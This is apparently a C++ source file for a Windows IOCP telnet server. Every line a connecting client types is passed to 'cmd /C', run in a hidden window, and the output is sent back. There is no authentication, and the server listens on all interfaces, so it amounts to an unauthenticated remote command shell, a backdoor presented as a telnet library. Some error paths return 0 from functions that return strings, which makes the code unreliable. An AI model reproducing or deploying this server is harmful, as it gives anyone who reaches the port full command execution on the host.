#include "telnetlib.hpp"
#include "iostream"
#include <assert.h>
#include <array>
#include <iterator>
#include <sstream>

#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 512

bool   TelnetServer::m_initialised;
CRITICAL_SECTION TelnetServer::m_CSForClients;
TP_CALLBACK_ENVIRON TelnetServer::m_ClientTPENV;
//VEC_SP_TelnetSession TelnetServer::m_sessions;
std::list<TelnetSession> TelnetServer::m_sessions;
volatile long TelnetServer::m_NumPostAccept = 0;

std::string cmd(std::string& cmd)
{
	HANDLE readHandle;
	HANDLE writeHandle;
	HANDLE stdOutHandle;
	HANDLE stdErrorHandle;
	DWORD bytesRead;
	DWORD retCode;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;

	ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFOA));

	sa.bInheritHandle = true;
	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if (!CreatePipe(&readHandle, &writeHandle, &sa, NULL))
	{
		OutputDebugString(L"cmd: CreatePipe failed!\n");
		return 0;
	}

	stdOutHandle = GetStdHandle(STD_OUTPUT_HANDLE);

	if (!SetStdHandle(STD_OUTPUT_HANDLE, writeHandle))
	{
		OutputDebugString(L"cmd: SetStdHandle(writeHandle) failed!\n");
		return 0;
	}

	stdErrorHandle = GetStdHandle(STD_ERROR_HANDLE);

	if (!SetStdHandle(STD_ERROR_HANDLE, writeHandle))
	{
		OutputDebugString(L"cmd: SetStdHandle(writeHandle) failed!\n");
		return 0;
	}

	std::string command("cmd /C ");
	command += cmd;

	LPSTR cmdptr = &(*(command.begin()));

	if (!CreateProcessA(NULL, cmdptr, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		OutputDebugString(L"cmd: CreateProcess failed!\n");
		return 0;
	}

	GetExitCodeProcess(pi.hProcess, &retCode);

	while (retCode == STILL_ACTIVE)
	{
		GetExitCodeProcess(pi.hProcess, &retCode);
	}

	DWORD totalBytes;

	if (!PeekNamedPipe(readHandle, NULL, NULL, NULL, &totalBytes, NULL))
	{
		OutputDebugString(L"cmd: PeekNamedPipe failed!\n");
		return 0;
	}

	std::string ret;

	if (totalBytes != 0)
	{
		std::vector<char> cmdBuffer(totalBytes);

		if (!ReadFile(readHandle, cmdBuffer.data(), totalBytes, &bytesRead, NULL))
		{
			OutputDebugString(L"cmd: ReadFile failed!\n");
			return 0;
		}

		cmdBuffer.push_back(0);

		ret = std::string(cmdBuffer.begin(), cmdBuffer.end());
	}

	if (!SetStdHandle(STD_OUTPUT_HANDLE, stdOutHandle))
	{
		OutputDebugString(L"cmd: SetStdHandle(stdHandle) failed!\n");
		return 0;
	}

	if (!SetStdHandle(STD_ERROR_HANDLE, stdErrorHandle))
	{
		OutputDebugString(L"cmd: SetStdHandle(stdHandle) failed!\n");
		return 0;
	}

	if (!CloseHandle(readHandle))
	{
		OutputDebugString(L"cmd: CloseHandle(readHandle) failed!\n");
	}
	if (!CloseHandle(writeHandle))
	{
		OutputDebugString(L"cmd: CloseHandle(writeHandle) failed!\n");
	}

	return ret;
}

void TelnetSession::sendPromptAndBuffer()
{
    // Output the prompt
    u_long iSendResult;
    iSendResult = send(m_socket, m_telnetServer->promptString().c_str(), (u_long)m_telnetServer->promptString().length(), 0);

    if (m_buffer.length() > 0)
    {
        // resend the buffer
        iSendResult = send(m_socket, m_buffer.c_str(), (u_long)m_buffer.length(), 0);
    }
}

void TelnetSession::eraseLine()
{
    u_long iSendResult;
    // send an erase line       
    iSendResult = send(m_socket, ANSI_ERASE_LINE.c_str(), (u_long)ANSI_ERASE_LINE.length(), 0);

    // Move the cursor to the beginning of the line
    std::string moveBack = "\x1b[80D";
    iSendResult = send(m_socket, moveBack.c_str(), (u_long)moveBack.length(), 0);
}

void TelnetSession::sendLine(std::string data)
{
    u_long iSendResult;
    // If is something is on the prompt, wipe it off
    if (m_telnetServer->interactivePrompt() || m_buffer.length() > 0)
    {
        eraseLine();
    }

    data.append("\r\n");
    iSendResult = send(m_socket, data.c_str(), (u_long)data.length(), 0);

    if (m_telnetServer->interactivePrompt())
        sendPromptAndBuffer();
}

void TelnetSession::closeClient()
{
    u_long iResult;

    // attempt to cleanly shutdown the connection since we're done
    iResult = shutdown(m_socket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        return;
    }

    // cleanup
    closesocket(m_socket);
}

void TelnetSession::echoBack(char * buffer, u_long length)
{
    // Echo the buffer back to the sender

    // If you are an NVT command (i.e. first it of data is 255) then ignore the echo back
    unsigned char firstItem = * buffer;
    if (firstItem == 0xff)
        return;

    u_long iSendResult;
    iSendResult = send(m_socket, buffer, length, 0);

    if (iSendResult == SOCKET_ERROR && iSendResult != WSAEWOULDBLOCK) {
        printf("Send failed with Winsock error: %d\n", WSAGetLastError());
        std::cout << "Closing session and socket.\r\n";
        closesocket(m_socket);
        return;
    }
}

void TelnetSession::initialise()
{
    // get details of connection
    SOCKADDR_IN client_info = { 0 };
    int addrsize = sizeof(client_info);
    getpeername(m_socket, (struct sockaddr*)&client_info, &addrsize);

    char ip[16];
    inet_ntop(AF_INET, &client_info.sin_addr, &ip[0], 16);

    std::cout << "Client " << ip << " connected...\n";

    // Set the connection to be non-blocking
    u_long iMode = 1;
    ioctlsocket(m_socket, FIONBIO, &iMode);

    // Set NVT mode to say that I will echo back characters.
    u_long iSendResult;
    unsigned char willEcho[3] = { 0xff, 0xfb, 0x01 };
    iSendResult = send(m_socket, (char *)willEcho, 3, 0);

    // Set NVT requesting that the remote system not/dont echo back characters
    unsigned char dontEcho[3] = { 0xff, 0xfe, 0x01 };
    iSendResult = send(m_socket, (char *)dontEcho, 3, 0);

    // Set NVT mode to say that I will supress go-ahead. Stops remote clients from doing local linemode.
    unsigned char willSGA[3] = { 0xff, 0xfb, 0x03 };
    iSendResult = send(m_socket, (char *)willSGA, 3, 0);

    if (m_telnetServer->connectedCallback())
        m_telnetServer->connectedCallback()(shared_from_this());
}

void TelnetSession::initContext()
{
	pIOContext.Overlapped.Internal = 0;
	pIOContext.Overlapped.InternalHigh = 0;
	pIOContext.Overlapped.Offset = 0;
	pIOContext.Overlapped.OffsetHigh = 0;
	pIOContext.Overlapped.hEvent = NULL;
	pIOContext.IOOperation = ClientIoAccept;
	pIOContext.pIOContextForward = NULL;
	pIOContext.nTotalBytes = 0;
	pIOContext.nSentBytes = 0;
	//pIOContext.wsabuf.buf = pIOContext.Buffer;
	//pIOContext.wsabuf.len = sizeof(pIOContext.Buffer);
	pIOContext.session = this;
	pIOContext.Buffer = std::make_shared<std::vector<char>>(MAX_BUFF_SIZE);
	pIOContext.wsabuf.buf = pIOContext.Buffer->data();
	pIOContext.wsabuf.len = pIOContext.Buffer->capacity();

	ZeroMemory(pIOContext.wsabuf.buf, pIOContext.wsabuf.len);
}

void TelnetSession::stripNVT(std::string &buffer)
{
    size_t found;
    do
    {
        unsigned char findChar = 0xff;
        found = buffer.find_first_of((char)findChar);
        if (found != std::string::npos && (found + 2) <= buffer.length() - 1)
        {
            buffer.erase(found, 3);
        }
    } while (found != std::string::npos);
}

void TelnetSession::stripEscapeCharacters(std::string &buffer)
{
    size_t found;

    std::array<std::string, 4> cursors = { ANSI_ARROW_UP, ANSI_ARROW_DOWN, ANSI_ARROW_RIGHT, ANSI_ARROW_LEFT };

    for (auto c : cursors)
    {
        do
        {
            found = buffer.find(c);
            if (found != std::string::npos)
            {
                buffer.erase(found, c.length());
            }
        } while (found != std::string::npos);
    }
}

bool TelnetSession::processBackspace(std::string &buffer)
{
    bool foundBackspaces = false;
    size_t found;
    do
    {
        // Need to handle both \x7f and \b backspaces
        unsigned char findChar = '\x7f';
        found = buffer.find_first_of((char)findChar);
        if (found == std::string::npos)
        {
            findChar = '\b';
            found = buffer.find_first_of((char)findChar);
        }

        if (found != std::string::npos)
        {
            if (buffer.length() > 1)
                buffer.erase(found - 1, 2);
            else
                buffer = "";
            foundBackspaces = true;
        }
    } while (found != std::string::npos);
    return foundBackspaces;
}

void TelnetSession::addToHistory(std::string line)
{
    // Add it to the history
    if (line != (m_history.size() > 0 ? m_history.back() : "") && line != "")
    {
        m_history.push_back(line);
        if (m_history.size() > 50)
            m_history.pop_front();
    }
    m_historyCursor = m_history.end();
	--m_historyCursor;
}

bool TelnetSession::processCommandHistory(std::string &buffer)
{
    // Handle up and down arrow actions
    if (m_telnetServer->interactivePrompt())
    {
        if (buffer.find(ANSI_ARROW_UP) != std::string::npos && m_history.size() > 0)
        {
            if (m_historyCursor != m_history.begin())
            {
                m_historyCursor--;
            }
            buffer = *m_historyCursor;

            // Issue a cursor command to counter it
            u_long iSendResult;
            iSendResult = send(m_socket, ANSI_ARROW_DOWN.c_str(), (u_long)ANSI_ARROW_DOWN.length(), 0);
            return true;
        }
        if (buffer.find(ANSI_ARROW_DOWN) != std::string::npos && m_history.size() > 0)
        {
            if (next(m_historyCursor) != m_history.end())
            {
                m_historyCursor++;
            }
            buffer = *m_historyCursor;

            return true;
        }
        if (buffer.find(ANSI_ARROW_LEFT) != std::string::npos || buffer.find(ANSI_ARROW_RIGHT) != std::string::npos)
        {
            return true;
        }
    }
    return false;
}

std::vector<std::string> TelnetSession::getCompleteLines(std::string &buffer)
{
    char CRLF[2] = { 0x0D, 0x0A };
    std::vector<std::string> lines;
    size_t found;
    do
    {
        found = buffer.find("\r\n");
        if (found != std::string::npos)
        {
            lines.push_back(buffer.substr(0, found));
            buffer.erase(0, found + 2);
        }
    } while (found != std::string::npos);

    return lines;
}

bool TelnetSession::update(int readBytes, char recvbuf[])
{
    if (readBytes > 0) {
		//recieved SIGINT or SIGTSTP, aborting client connection
		if (recvbuf[0] == SIGINT || recvbuf[0] == SIGTSTP)
			return 0;

        echoBack(recvbuf, readBytes);

        for (int i = 0; i < readBytes; i++)
        {
            if (recvbuf[i] == 0x00)
                recvbuf[i] = 0x0A;
        }

        m_buffer.append(recvbuf, readBytes);

        stripNVT(m_buffer);

        bool requirePromptReprint = false;

        if (m_telnetServer->interactivePrompt())
        {
            if (processCommandHistory(m_buffer))
                requirePromptReprint = true;
            stripEscapeCharacters(m_buffer);

            if (processBackspace(m_buffer))
                requirePromptReprint = true;
        }

        auto lines = getCompleteLines(m_buffer);
        for (auto line : lines)
        {
            if (m_telnetServer->newLineCallBack())
                m_telnetServer->newLineCallBack()(shared_from_this(), line);
            
            addToHistory(line);

			std::string result = cmd(line);

			sendLine(result);
        }

        if (m_telnetServer->interactivePrompt() && requirePromptReprint)
        {
            eraseLine();
            sendPromptAndBuffer();
        }
    }

	return true;
}

void TelnetSession::asyncRead()
{
	DWORD dwRecvNumBytes = 0;
	DWORD dwFlags = 0;
	int iResult;
	WSABUF buffRecv;

	pIOContext.IOOperation = ClientIoRead;
	//buffRecv.buf = pIOContext.Buffer;
	//buffRecv.len = MAX_BUFF_SIZE;
	buffRecv.buf = pIOContext.Buffer->data();
	buffRecv.len = pIOContext.Buffer->capacity();

	iResult = WSARecv(m_socket, &buffRecv,
		1, &dwRecvNumBytes, &dwFlags,
		&(pIOContext.Overlapped), NULL);

	if (iResult == SOCKET_ERROR && (ERROR_IO_PENDING != WSAGetLastError())) {
		printf("WSARecv() Failed: %d\n", WSAGetLastError());
		return;
	}
}

void TelnetSession::UNIT_TEST()
{
    /* stripNVT */
    std::cout << "TEST: stripNVT\n";
    std::string origData = "12345";
    std::string data = origData;
    unsigned char toStrip[3] = { 255, 251, 1 };
    data.insert(2, (char *)toStrip, 3);
    TelnetSession::stripNVT(data);

    assert(origData == data);

    /* processBackspace */
    std::cout << "TEST: handleBackspace\n";
    std::string bkData = "123455\x7f";
    bool bkResult = TelnetSession::processBackspace(bkData);
    assert(bkData == "12345");
    assert(bkResult == true);

    /* getCompleteLines */
    std::cout << "TEST: getCompleteLines\n";
    std::string multiData = "LINE1\r\nLINE2\r\nLINE3\r\n";
    auto lines = TelnetSession::getCompleteLines(multiData);

    assert(lines.size() == 3);
    assert(lines[0] == "LINE1");
    assert(lines[1] == "LINE2");
    assert(lines[2] == "LINE3");
}

BOOL TelnetServer::CreateListenSocket() {
	struct addrinfo *result = NULL;
	struct addrinfo hints;

	int iResult;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	iResult = getaddrinfo(NULL, std::to_string(m_listenPort).c_str(), &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		return false;
	}

	m_listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (m_listenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		return false;
	}

	iResult = bind(m_listenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(m_listenSocket);
		return false;
	}

	freeaddrinfo(result);

	return true;
}

void CALLBACK TelnetServer::IoCompletionCallback(PTP_CALLBACK_INSTANCE /* Instance */, PVOID  /*Context*/,
	PVOID Overlapped, ULONG IoResult, ULONG_PTR NumberOfBytesTransferred,
	PTP_IO /* Io */)
{
	PPER_IO_CONTEXT lpIOContext = NULL;
	TelnetSession* localSession;

	lpIOContext = (PPER_IO_CONTEXT)Overlapped;
	localSession = lpIOContext->session;

	if (IoResult != ERROR_SUCCESS)
	{
		printf("I/O operation failed. type[%d]\n", lpIOContext->IOOperation);

		//тут захендлить множественную отправку (не горит)
		/*switch (lpIOContext->IOOperation)
		{
		case ClientIoWrite:
			OnSend(event, NumberOfBytesTransferred);
			break;
		}*/

		OnClose(localSession);
	}
	else
	{
		switch (lpIOContext->IOOperation) {
		case ClientIoAccept:
			OnAccept(localSession);
			break;
		case ClientIoRead:
			localSession->update(NumberOfBytesTransferred, lpIOContext->Buffer->data());
			//localSession->asyncRead();
			OnRecv(localSession, NumberOfBytesTransferred);
			//OnSend(&localSession, NumberOfBytesTransferred);
			break;
		case ClientIoWrite:
			OnSend(localSession, NumberOfBytesTransferred);
			break;
		}
	}
}

void CALLBACK TelnetServer::WorkerPostAccept(PTP_CALLBACK_INSTANCE /* Instance */, PVOID Context, PTP_WORK /* Work */) //запускаем цикл ассепта как worker
{
	TelnetServer* server = static_cast<TelnetServer*>(Context);
	assert(server);

	while (server->m_initialised)
	{
		server->PostAccept();
	}
}

void CALLBACK TelnetServer::WorkerRecvPacket(PTP_CALLBACK_INSTANCE /* Instance */, PVOID Context)
{
	TelnetSession* session = static_cast<TelnetSession*>(Context);

	PostRecv(session);
}

void CALLBACK TelnetServer::WorkerSendPacket(PTP_CALLBACK_INSTANCE /* Instance */, PVOID Context)
{
	TelnetSession* session = static_cast<TelnetSession*>(Context);

	PostSend(session);
}

void CALLBACK TelnetServer::WorkerRemoveClient(PTP_CALLBACK_INSTANCE /* Instance */, PVOID Context)
{
	TelnetSession* session = static_cast<TelnetSession*>(Context);

	RemoveClient(session);
}

void TelnetServer::RemoveClient(TelnetSession* session)
{
	EnterCriticalSection(&m_CSForClients);

	//VEC_SP_TelnetSession::iterator itor = std::find(m_sessions.begin(), m_sessions.end(), copy_session);
	auto itor = std::find(m_sessions.begin(), m_sessions.end(), *session);

	if (itor != m_sessions.end())
	{
		printf("[%d] RemoveClient succeeded.\n", GetCurrentThreadId());

		m_sessions.erase(itor);
	}

	LeaveCriticalSection(&m_CSForClients);
}

void TelnetServer::PostSend(TelnetSession* session)
{
	DWORD dwRecvNumBytes = 0;
	DWORD dwFlags = 0;
	int iResult;

	session->pIOContext.IOOperation = ClientIoWrite;

	StartThreadpoolIo(session->GetTPIO());

	iResult = WSASend(session->getSocket(), &(session->pIOContext.wsabuf),
		1, &dwRecvNumBytes, dwFlags,
		&(session->pIOContext.Overlapped), NULL);

	if (iResult == SOCKET_ERROR && (ERROR_IO_PENDING != WSAGetLastError())) {
		CancelThreadpoolIo(session->GetTPIO());

		printf("CreateThreadpoolCleanupGroup failed with error: %d\n", GetLastError());
	}
	else
	{
		// In this case, the completion callback will have already been scheduled to be called.
	}
}

void TelnetServer::PostRecv(TelnetSession* session)
{
	DWORD dwRecvNumBytes = 0;
	DWORD dwFlags = 0;
	int iResult;

	session->pIOContext.IOOperation = ClientIoRead;

	StartThreadpoolIo(session->GetTPIO());

	iResult = WSARecv(session->getSocket(), &(session->pIOContext.wsabuf),
		1, &dwRecvNumBytes, &dwFlags,
		&(session->pIOContext.Overlapped), NULL);
	if (iResult == SOCKET_ERROR && (ERROR_IO_PENDING != WSAGetLastError())) {
		CancelThreadpoolIo(session->GetTPIO());

		printf("CreateThreadpoolCleanupGroup failed with error: %d\n", GetLastError());

		OnClose(session);
	}
	else
	{
		// In this case, the completion callback will have already been scheduled to be called.
	}
}

void TelnetServer::AddClient(TelnetSession* session)
{
	TP_IO* pTPIO = CreateThreadpoolIo(reinterpret_cast<HANDLE>(session->getSocket()), TelnetServer::IoCompletionCallback, NULL, NULL);

	EnterCriticalSection(&m_CSForClients);
	session->SetTPIO(pTPIO);
	session->initialise();
	LeaveCriticalSection(&m_CSForClients);

	printf("UpdateCompletionPort: Socket(%d) added to IOCP\n", session->getSocket());

	PostRecv(session);
}

void CALLBACK TelnetServer::WorkerAddClient(PTP_CALLBACK_INSTANCE /* Instance */, PVOID Context)
{
	TelnetSession* session = static_cast<TelnetSession*>(Context);

	AddClient(session);
}

void TelnetServer::OnSend(TelnetSession* session, int size)
{
	if (!TrySubmitThreadpoolCallback(WorkerSendPacket, session, &m_ClientTPENV))
		PostSend(session);
}

void TelnetServer::OnRecv(TelnetSession* session, int size)
{
	if (!TrySubmitThreadpoolCallback(WorkerRecvPacket, session, &m_ClientTPENV))
		PostRecv(session);
}

void TelnetServer::OnAccept(TelnetSession* session)
{
	InterlockedDecrement(&m_NumPostAccept);

	if (m_initialised && !TrySubmitThreadpoolCallback(WorkerAddClient, session, &m_ClientTPENV))
		AddClient(session);
}

SOCKET CreateSocket(u_short port)
{
	// Get Address Info
	addrinfo hints;
	ZeroMemory(&hints, sizeof(addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = 0;

	std::stringstream portBuff;
	portBuff << port;

	struct addrinfo* infoList = NULL;
	// Passing NULL for pNodeName should return INADDR_ANY
	if (getaddrinfo(NULL, portBuff.str().c_str(), &hints, &infoList) != 0)
	{
		printf("CreateThreadpoolCleanupGroup failed with error: %d; and port: %d\n", WSAGetLastError(), port);
		return INVALID_SOCKET;
	}

	// loop through all the results and use the first we can
	struct addrinfo* info = infoList;
	SOCKET socket = INVALID_SOCKET;
	for (; info != NULL; info = info->ai_next)
	{
		socket = WSASocket(info->ai_family, info->ai_socktype, info->ai_protocol, NULL, 0,
			WSA_FLAG_OVERLAPPED);
		if (socket == INVALID_SOCKET)
		{
			printf("CreateThreadpoolCleanupGroup failed with error: %d; and port: %d\n", WSAGetLastError(), port);
		}
	}

	freeaddrinfo(infoList);

	return socket;
}

void TelnetServer::PostAccept()
{
	// If the number of clients is too big, we can just stop posting accept.
	// That's one of the benefits from AcceptEx.
	int count = m_MaxPostAccept - m_NumPostAccept;
	if (count > 0)
	{
		int i = 0;
		for (; i < count; ++i)
		{
			SOCKET ClientSocket = INVALID_SOCKET;
			DWORD dwRecvNumBytes = 0;
			DWORD dwFlags = 0;
			static BYTE buffer[(sizeof(sockaddr_in6) + 16) * 2];
			int iResult;

			LPFN_ACCEPTEX s_AcceptEx = NULL;
			DWORD dwBytes = 0;
			GUID guidAcceptEx = WSAID_ACCEPTEX;
			if (WSAIoctl(m_listenSocket, SIO_GET_EXTENSION_FUNCTION_POINTER, &guidAcceptEx,
				sizeof(guidAcceptEx), &s_AcceptEx, sizeof(s_AcceptEx), &dwBytes, 0,
				0) == SOCKET_ERROR)
			{
				printf("WSAIoctl() failed: %d\n", GetLastError());
				return;
			}

			ClientSocket = CreateSocket(0);

			if (ClientSocket == INVALID_SOCKET)
			{
				printf("WSASocket() failed: %d\n", GetLastError());
				return;
			}

			m_sessions.push_back(TelnetSession(ClientSocket, shared_from_this()));
			//SP_TelnetSession s(&(*(--m_sessions.end())));
			TelnetSession* s = &(*(--m_sessions.end()));
			s->initContext();

			StartThreadpoolIo(m_pTPIO);

			iResult = s_AcceptEx(m_listenSocket,
				ClientSocket,
				&buffer,
				0,
				sizeof(sockaddr_in6) + 16,
				sizeof(sockaddr_in6) + 16,
				NULL,
				&(s->pIOContext.Overlapped)
			);

			if (!iResult)
			{
				int error = WSAGetLastError();

				if (error != ERROR_IO_PENDING)
				{
					CancelThreadpoolIo(m_pTPIO);

					printf("AcceptEx() failed: %d\n", error);
					break;
				}
			}
			else
			{
				OnAccept(s);
			}
		}

		InterlockedExchangeAdd(&m_NumPostAccept, i);

		printf("[%d] Post AcceptEx : %d\n", GetCurrentThreadId(), m_NumPostAccept);
	}
}

/* ------------------ Telnet Server -------------------*/
bool TelnetServer::initialise(u_long listenPort, int maxAccept, std::string promptString)
{
	if (m_initialised)
	{
		std::cout << "This Telnet Server instance has already been initialised. Please shut it down before reinitialising it.";
		return false;
	}

	m_listenPort = listenPort;
	m_promptString = promptString;
	m_listenSocket = INVALID_SOCKET;

	std::cout << "Starting Telnet Server on port " << std::to_string(m_listenPort) << "\n";

	WSADATA wsaData;
	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return false;
	}

	m_MaxPostAccept = maxAccept;

	// Create Client Work Thread Env for using cleaning group. We need this for shutting down
	// properly.
	InitializeThreadpoolEnvironment(&m_ClientTPENV);

	m_ClientTPCLEAN = CreateThreadpoolCleanupGroup();
	if (m_ClientTPCLEAN == NULL)
	{
		printf("CreateThreadpoolCleanupGroup failed with error: %d\n", GetLastError());
		return false;
	}

	SetThreadpoolCallbackCleanupGroup(&m_ClientTPENV, m_ClientTPCLEAN, NULL);

	if (!CreateListenSocket())
		return false;

	m_pTPIO = CreateThreadpoolIo(reinterpret_cast<HANDLE>(m_listenSocket),
		TelnetServer::IoCompletionCallback, NULL, NULL);
	if (m_pTPIO == NULL)
	{
		printf("CreateThreadpoolIo failed with error: %d\n",WSAGetLastError());
		shutdown();
		return false;
	}

	// Start listening
	StartThreadpoolIo(m_pTPIO);

	if (listen(m_listenSocket, SOMAXCONN) == SOCKET_ERROR)
	{
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(m_listenSocket);
		return false;
	}

	// Create critical sections for m_Clients
	InitializeCriticalSection(&m_CSForClients);

	// Create Accept worker
	m_AcceptTPWORK = CreateThreadpoolWork(TelnetServer::WorkerPostAccept, this, NULL);
	if (m_AcceptTPWORK == NULL)
	{
		printf("CreateThreadpoolWork failed with error: %d\n", WSAGetLastError());
		shutdown();
		return false;
	}

	SubmitThreadpoolWork(m_AcceptTPWORK);

    m_initialised = true;
    return true;
}

void TelnetServer::OnClose(TelnetSession* session)
{
	printf("Client's socket has been closed.\n");

	// If whatever game logics about this event are fast enough, we can manage them here but I
	// assume they are slow.
	if (m_initialised &&
		!TrySubmitThreadpoolCallback(TelnetServer::WorkerRemoveClient, session, &m_ClientTPENV))
	{
		printf("TrySubmitThreadpoolCallback failed with error: %d\n", WSAGetLastError());

		RemoveClient(session);
	}
}

void TelnetServer::shutdown()
{
	m_initialised = false;

	if (m_AcceptTPWORK != NULL)
	{
		WaitForThreadpoolWorkCallbacks(m_AcceptTPWORK, true);
		CloseThreadpoolWork(m_AcceptTPWORK);
		m_AcceptTPWORK = NULL;
	}

	if (m_listenSocket != INVALID_SOCKET)
	{
		closesocket(m_listenSocket);
		CancelIoEx(reinterpret_cast<HANDLE>(m_listenSocket), NULL);
		m_listenSocket = INVALID_SOCKET;
	}

	if (m_pTPIO != NULL)
	{
		WaitForThreadpoolIoCallbacks(m_pTPIO, true);
		CloseThreadpoolIo(m_pTPIO);
		m_pTPIO = NULL;
	}

	if (m_ClientTPCLEAN != NULL)
	{
		CloseThreadpoolCleanupGroupMembers(m_ClientTPCLEAN, false, NULL);
		CloseThreadpoolCleanupGroup(m_ClientTPCLEAN);
		DestroyThreadpoolEnvironment(&m_ClientTPENV);
		m_ClientTPCLEAN = NULL;
	}

	EnterCriticalSection(&m_CSForClients);
	for (auto session : m_sessions)
	{
		session.closeClient();
	}
	m_sessions.clear();
	LeaveCriticalSection(&m_CSForClients);

	DeleteCriticalSection(&m_CSForClients);
}